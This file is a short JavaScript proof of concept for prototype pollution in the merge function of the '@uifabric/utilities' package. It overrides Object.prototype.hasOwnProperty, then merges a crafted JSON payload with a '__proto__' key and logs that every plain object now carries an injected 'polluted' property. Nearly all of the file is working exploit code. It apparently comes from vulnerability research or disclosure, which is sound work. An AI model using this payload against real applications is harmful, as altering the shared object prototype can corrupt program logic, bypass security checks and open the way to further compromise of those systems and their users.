Object.prototype.hasOwnProperty = () => true;
const util = require('@uifabric/utilities');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
const source2 = { k3: {} };
console.log({}.polluted);
y = util.merge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);